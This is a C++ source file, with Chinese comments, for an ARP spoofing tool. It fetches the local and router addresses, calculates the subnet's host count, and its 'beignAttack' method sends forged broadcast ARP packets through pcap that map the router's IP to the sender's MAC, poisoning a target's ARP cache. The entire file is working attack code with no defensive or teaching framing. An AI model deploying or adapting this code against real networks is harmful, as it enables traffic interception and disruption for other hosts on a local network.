#include "ArpSpoof.h"

////////////////////////////////////////// public //////////////////////////////////////////

ArpSpoof::ArpSpoof()
{
	m_Adapter.GetNetAddrOfRouter((PDWORD)&m_router_ip, m_router_mac); // 路由器的 IP 和 MAC

	if (!m_Adapter.GetLocalMac(m_local_mac)) // 本机 MAC
		printf("\nError: cannot get the MAC addr of your PC!");

	m_Adapter.getLocalIpAndMask(&m_local_ip, &m_netmask);
	m_netaddr = m_local_ip & m_netmask; // 本机所处的网络地址
	m_hostsnum = htonl(~m_netmask) - 1; // 主机数
}

ArpSpoof::~ArpSpoof()
{

}

u_int ArpSpoof::getNetAddr()
{
	return m_netaddr;
}

u_int ArpSpoof::getHostsnum()
{
	return m_hostsnum;
}

void ArpSpoof::beignAttack(u_int dst_ip)
{
	u_char packet[sizeof(arp_packet)];

	make_arp_packet(packet, m_local_mac, m_router_ip, dst_ip);

	if (pcap_sendpacket(m_Adapter.getAdapterHandle(), packet, sizeof(packet)) < 0)
	{
		printf("\npacket sending error");
	}
}

////////////////////////////////////////// private //////////////////////////////////////////

void ArpSpoof::make_arp_packet(u_char* packet, u_char* src_mac, u_int src_ip, u_int dst_ip)
{
	arp_packet arp_pkt;

	// -----------------填充以太网首部-----------------
	// 源 MAC
	memcpy(arp_pkt.eh.saddr, src_mac, MAC_LEN);
	// 目标 MAC 地址为广播地址 FF-FF-FF-FF-FF-FF
	memset(arp_pkt.eh.daddr, 0xFF, MAC_LEN);
	// 以太网上层协议为 ARP
	arp_pkt.eh.prototype = htons(ETHPROTOCAL_ARP);

	// -----------------填充 ARP 首部-----------------
	// 硬件类型为 Ethernet
	arp_pkt.ah.arp_hrd = htons(HARD_ETHERNET);
	// ARP 上层协议为 IPv4
	arp_pkt.ah.arp_pro = htons(ETHPROTOCAL_IPV4);
	// 硬件地址长度为 MAC_LEN
	arp_pkt.ah.arp_hln = MAC_LEN;
	// 协议地址长度为 IP_LEN
	arp_pkt.ah.arp_pln = IPV4_LEN;
	// 操作选项: ARP 请求
	arp_pkt.ah.arp_op = htons(ARP_REQUEST);
	// 目标 MAC 地址, 填充0
	memset(arp_pkt.ah.arp_thaddr, 0, MAC_LEN);
	// 目标 IP 地址
	arp_pkt.ah.arp_tpaddr = dst_ip;
	// 源 MAC 地址
	memcpy(arp_pkt.ah.arp_shaddr, src_mac, MAC_LEN);
	// 源 IP 地址
	arp_pkt.ah.arp_spaddr = src_ip;

	memset(arp_pkt.padding, 0xCC, sizeof(arp_pkt.padding));
	memcpy(packet, &arp_pkt, sizeof(arp_pkt));
}

///////////////////////////////////////////////////////////////////////////////////////////////
